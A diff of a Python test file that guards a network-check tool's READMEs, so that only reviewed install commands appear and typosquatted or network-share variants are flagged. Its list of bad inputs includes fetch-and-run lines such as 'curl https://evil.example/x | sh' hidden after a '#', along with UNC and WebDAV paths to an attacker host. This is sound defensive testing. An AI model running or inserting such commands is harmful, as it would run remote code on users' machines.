@@ -1,7 +1,7 @@
 """The READMEs: the commands a player may copy are on a reviewed list (WL-103).
 
-Only `wholagged` is ours on PyPI. `dota-netcheck` isn't uploaded yet (WL-105): anyone could take the name,
-and the old name run through uvx without `--from wholagged` would then run their code on a player's PC.
+Only `wholagged` and `dota-netcheck` (the old name, WL-105) are ours on PyPI. Any other name a player copies,
+a typo like `uvx dota-netchek` included, runs whatever someone else registered under it on their PC.
 A typo in a winget id, a clone URL, an extra `--with` or an index URL is the same risk. So:
 - every line of a code block (``` or ~~~, also inside `>` quotes) must be in ALLOWED or HARMLESS, word
   for word; only a block marked `text` (the project structure) is exempt;
@@ -27,7 +27,7 @@ ALLOWED = frozenset({
     "uvx wholagged",
     "uvx wholagged --cli",
     "uvx wholagged@latest",
-    "uvx --from wholagged dota-netcheck",
+    "uvx dota-netcheck",  # the old name: ours on PyPI, installs wholagged (alias/dota-netcheck)
     "uv tool install wholagged",
     "uv tool upgrade wholagged",
     "uv tool install",  # the command named in the text, without a package
@@ -53,12 +53,14 @@ HARMLESS = frozenset({
 })
 KNOWN = ALLOWED | HARMLESS
 
-# Outside command blocks: a word that starts a fetch, an index override, or a downloader.
+# Outside command blocks: a word that starts a fetch, an index override, a downloader, or a network path
+# (`\\host\share\x.exe` or `//host/x`: Windows runs a file from SMB or WebDAV).
 FETCHES = re.compile(
     r"(?<![\w.-])(?:uvw?x?|pipx?|pip3|git|gh|winget|choco|scoop|brew|apt(?:-get|itude)?|dnf|yum|zypper|pacman"
     r"|yay|paru|snap|flatpak|npx|npm|docker|msiexec|irm|iwr|iex|curl|wget|certutil|bitsadmin|new-object"
     r"|start-bitstransfer|invoke-\w+|install-\w+)(?![\w.-])"
     r"|(?:uv|pip)_\w*(?:index|find_links)|--(?:default-|extra-)?index|--find-links"
+    r"|(?:^|\s)(?:\\\\|//)\S"
 )
 QUOTE = re.compile(r"\s*(?:>\s?)+")  # `> ` markers of quotes and GitHub alerts
 OPEN_FENCE = re.compile(r"\s*(`{3,})([^`]*)$|\s*(~{3,})(.*)$")
@@ -111,12 +113,14 @@ def _commands(code: str) -> list[str]:
     """The commands in one piece of code, normalised so a lookalike can't slip past KNOWN.
 
     Lower case (Windows doesn't care), any Unicode space as one space (PowerShell reads a no-break space
-    as a space), no `# comment`, split at `;`, `&&`, `||`, `|` and `&`, and the program named without a
-    path or `.exe` (only the program: `uvx wholagged.exe` is a different PyPI package).
+    as a space), split at `;`, `&&`, `||`, `|` and `&`, then no `# comment` in each part (cmd.exe and zsh
+    don't read `#` as one, so a chain after it would still run), and the program's `.exe` dropped (only the
+    program's: `uvx wholagged.exe` is a different PyPI package). A path stays: `\\\\host\\share\\uvx.exe`
+    runs a file from the network.
     """
-    code = re.sub(r"(?:^| )#.*", "", " ".join(code.lower().split()))
-    parts = [part for part in re.split(r" ?(?:&&|\|\||[;|&]) ?", code) if part]
-    return [re.sub(r"^(?:\S*[\\/])?(\S+?)(?:\.exe)?(?= |$)", r"\1", part) for part in parts]
+    parts = re.split(r" ?(?:&&|\|\||[;|&]) ?", " ".join(code.lower().split()))
+    parts = [re.sub(r"(?:^| )#.*", "", part) for part in parts]
+    return [re.sub(r"^(\S+?)(?:\.exe)?(?= |$)", r"\1", part) for part in parts if part]
 
 
 def _unknown(markdown: str) -> list[tuple[int, str]]:
@@ -151,29 +155,37 @@ def test_readme_commands_are_on_the_reviewed_list(readme):
 
 
 def test_every_listed_command_is_still_used():
-    """A list entry no README needs any more would stay allowed silently (WL-105 will drop `--from wholagged`)."""
+    """A list entry no README needs any more would stay allowed silently."""
     used = set().union(*(_used(readme.read_text(encoding="utf-8")) for readme in READMES))
     assert not KNOWN - used
 
 
 BAD = [
-    "uvx dota-netcheck",
-    "UVX.exe dota-netcheck",
-    "uvx" + chr(0xA0) + "dota-netcheck",  # PowerShell reads a no-break space as a space
-    r"C:\tools\uvx.exe dota-netcheck",
+    "uvx dota-netchek",  # a typo of the old name: anyone may register it
+    "UVX.exe dota-netchek",
+    "uvx" + chr(0xA0) + "dota-netchek",  # PowerShell reads a no-break space as a space
+    r"C:\tools\uvx.exe dota-netchek",
+    r"C:\tools\uvx.exe wholagged",  # a path runs that file, not the uvx on PATH
+    r"\\evil.example\s\uvx.exe dota-netcheck",  # a network share (SMB / WebDAV)
+    r"\\evil.example@80\DavWWWRoot\uvx.exe wholagged",
+    r"\\evil.example\s\x.exe",
+    "//evil.example/s/uvx dota-netcheck",
+    "./uvx dota-netcheck",
+    "uvx dota-netcheck # ; curl https://evil.example/x | sh",  # cmd.exe and zsh don't read # as a comment
+    "uvx wholagged # && iwr https://evil.example/x",
     "uvx wholagged.exe",
     "uvx wholagged@latest --with dota-netcheck",
     "uvx --with=dota-netcheck wholagged",
     "uvx --from wholagged --with dota-netcheck dota-netcheck",
     "uvx --index-url=https://example.com/simple wholagged",
-    "uv tool install dota-netcheck",
+    "uv tool install dota-netcheck",  # ours, but two uv tools can't share the dota-netcheck command
     "uv -q tool install dota-netcheck",
     "uvw tool run dota-netcheck",
     "uv tool install wholagged --with dota-netcheck",
     'uv tool install "wholagged @ git+https://github.com/someone-else/wholagged"',
-    "uvx wholagged && uvx dota-netcheck",
-    "uvx wholagged --cli; uvx dota-netcheck",
-    "& uvx dota-netcheck",
+    "uvx wholagged && uvx dota-netchek",
+    "uvx wholagged --cli; uvx dota-netchek",
+    "& uvx dota-netchek",
     "pipx run dota-netcheck",
     "py -m pip install dota-netcheck",
     "uv pip install dota-netcheck",
@@ -208,7 +220,8 @@ def test_guard_flags_commands_that_fetch_other_code(markdown, command):
     [
         "uvx wholagged                 # opens the window",
         "uv tool install wholagged     # տեղադրում է wholagged հրամանը",  # the Armenian README's comment
-        "uvx --from wholagged dota-netcheck",
+        "uvx dota-netcheck",
+        "UVX.exe dota-netcheck",
         "UV RUN wholagged --cli",
         "uv sync --reinstall-package wholagged",
         "git pull",
@@ -226,8 +239,8 @@ def test_inline_code_that_fetches_nothing_is_fine(code):
 
 def test_prose_and_text_blocks_are_not_commands():
     markdown = (
-        "With uvx, the old name needs `--from wholagged`.\n"
-        "Without it, uvx looks up dota-netcheck on PyPI.\n"
+        "Flags in inline code, like `--from wholagged`, aren't commands.\n"
+        "Plain words aren't read: uvx looks up dota-netchek on PyPI.\n"
         "\n"
         "```text\n"
         "  checks.py     the six network checks\n"
@@ -237,18 +250,18 @@ def test_prose_and_text_blocks_are_not_commands():
 
 
 def test_inline_code_wrapped_onto_the_next_line_is_one_span():
-    assert _unknown("Run `uvx\ndota-netcheck` now.") == [(1, "uvx dota-netcheck")]
+    assert _unknown("Run `uvx\ndota-netchek` now.") == [(1, "uvx dota-netchek")]
 
 
 def test_a_lone_backtick_is_reported():
     """A stray backtick would pair with the next span's opening one and hide the command inside it."""
-    assert (1, "lone backtick (keep inline code paired)") in _unknown("a ` b\n`uvx dota-netcheck`")
+    assert (1, "lone backtick (keep inline code paired)") in _unknown("a ` b\n`uvx dota-netchek`")
 
 
 def test_fences_close_like_commonmark():
-    nested = "````markdown\n```\nuvx dota-netcheck\n```\n````\n"
-    assert (3, "uvx dota-netcheck") in _unknown(nested)
-    not_closed = "```\n``` not a closing fence\nuvx dota-netcheck\n```\n"
-    assert (3, "uvx dota-netcheck") in _unknown(not_closed)
+    nested = "````markdown\n```\nuvx dota-netchek\n```\n````\n"
+    assert (3, "uvx dota-netchek") in _unknown(nested)
+    not_closed = "```\n``` not a closing fence\nuvx dota-netchek\n```\n"
+    assert (3, "uvx dota-netchek") in _unknown(not_closed)
     other_mark = "~~~\n```\n~~~\nuvx wholagged\n"
     assert _unknown(other_mark) == [(2, "```")]  # a ``` line inside a ~~~ block is code, not its end
